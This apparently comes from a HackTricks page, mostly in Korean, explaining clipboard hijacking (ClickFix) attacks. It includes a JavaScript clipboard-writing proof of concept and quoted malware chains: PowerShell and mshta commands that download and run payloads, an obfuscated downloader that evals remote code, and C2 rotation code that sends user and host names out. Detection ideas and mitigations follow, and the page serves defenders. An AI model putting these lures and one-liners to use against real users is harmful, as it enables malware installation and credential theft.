# 클립보드 하이재킹 (Pastejacking) 공격

{{#include ../../banners/hacktricks-training.md}}

> "본인이 직접 복사하지 않은 것은 절대 붙여넣지 마라." – 오래된 조언이지만 여전히 유효하다

## 개요

클립보드 하이재킹 – *pastejacking*이라고도 함 – 은 사용자가 명령을 검사하지 않고 일상적으로 복사-붙여넣기 하는 사실을 악용한다. 악성 웹 페이지(또는 JavaScript가 동작하는 컨텍스트, 예: Electron이나 데스크탑 애플리케이션)는 프로그래밍적으로 공격자가 제어하는 텍스트를 시스템 클립보드에 넣는다. 피해자는 보통 정교하게 구성된 소셜 엔지니어링 지시를 통해 **Win + R**(실행 대화상자), **Win + X**(Quick Access / PowerShell)를 누르거나 터미널을 열고 *붙여넣기* 한 클립보드 내용을 실행하여 즉시 임의의 명령을 실행하도록 유도된다.

**파일이 다운로드되지 않고 첨부파일이 열리지 않기 때문에**, 이 기법은 첨부파일, 매크로 또는 직접 명령 실행을 모니터링하는 대부분의 이메일 및 웹 콘텐츠 보안 제어를 우회한다. 따라서 이 공격은 NetSupport RAT, Latrodectus loader 또는 Lumma Stealer와 같은 일반 악성코드 계열을 배포하는 피싱 캠페인에서 널리 사용된다.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake 흐름

1. 사용자가 typosquatted 또는 compromised 사이트를 방문한다 (예: `docusign.sa[.]com`)
2. 주입된 **ClearFake** JavaScript는 `unsecuredCopyToClipboard()` 헬퍼를 호출해 클립보드에 Base64-encoded PowerShell one-liner를 조용히 저장한다.
3. HTML 지침은 피해자에게 다음을 지시한다: *“Press **Win + R**, 명령을 붙여넣고 Enter를 눌러 문제를 해결하세요.”*
4. `powershell.exe`가 실행되어 합법적인 실행파일과 악성 DLL을 포함한 아카이브를 다운로드한다 (classic DLL sideloading).
5. 로더는 추가 스테이지를 복호화하고, shellcode를 주입하며 persistence(예: scheduled task)를 설치한다 — 결국 NetSupport RAT / Latrodectus / Lumma Stealer를 실행한다.

### NetSupport RAT 체인 예시
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (정상적인 Java WebStart)는 자신의 디렉터리에서 `msvcp140.dll`을 검색합니다.
* 악성 DLL은 **GetProcAddress**로 API 주소를 동적으로 가져오고, **curl.exe**를 통해 두 개의 바이너리(`data_3.bin`, `data_4.bin`)를 다운로드하며, 롤링 XOR 키 `"https://google.com/"`로 이를 복호화하고, 최종 shellcode를 인젝션한 뒤 **client32.exe** (NetSupport RAT)를 `C:\ProgramData\SecurityCheck_v1\`에 압축 해제합니다.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe**로 `la.txt`를 다운로드한다
2. **cscript.exe** 안에서 JScript downloader를 실행한다
3. MSI payload를 가져옴 → 서명된 애플리케이션 옆에 `libcef.dll`를 드롭함 → DLL sideloading → shellcode → Latrodectus.

### MSHTA를 통한 Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 호출은 숨겨진 PowerShell 스크립트를 실행하여 `PartyContinued.exe`를 가져오고, `Boat.pst` (CAB)을 추출하며 `extrac32`와 파일 결합을 통해 `AutoIt3.exe`를 재구성한 다음 최종적으로 `.a3x` 스크립트를 실행하여 browser credentials를 `sumeriavgv.digital`로 exfiltrates.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

일부 ClickFix 캠페인은 파일 다운로드를 완전히 건너뛰고 피해자에게 WSH를 통해 JavaScript를 가져와 실행하는 one‑liner를 붙여넣도록 지시하며, 이를 지속화하고 C2를 매일 교체합니다. 관찰된 예시 체인:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
주요 특징
- 단순한 검사로부터 숨기기 위해 런타임에 역순으로 처리되는 난독화된 URL.
- JavaScript는 Startup LNK (WScript/CScript)를 통해 지속성을 확보하며, 현재 날짜에 따라 C2를 선택하여 빠른 도메인 회전을 가능하게 한다.

날짜별로 C2를 회전시키기 위해 사용된 최소한의 JS 코드 조각:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
다음 단계에서는 일반적으로 loader를 배포하여 persistence를 확보하고 RAT(예: PureHVNC)을 가져오며, 종종 TLS를 하드코딩된 certificate에 pinning하고 트래픽을 청크 처리한다.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` keeps a history of **Win + R** commands – look for unusual Base64 / obfuscated entries.
* Security Event ID **4688** (Process Creation) where `ParentImage` == `explorer.exe` and `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** for file creations under `%LocalAppData%\Microsoft\Windows\WinX\` or temporary folders right before the suspicious 4688 event.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` followed immediately by a new PowerShell process.

## Mitigations

1. Browser hardening – disable clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) or require user gesture.
2. Security awareness – teach users to *type* sensitive commands or paste them into a text editor first.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control to block arbitrary one-liners.
4. Network controls – block outbound requests to known pastejacking and malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
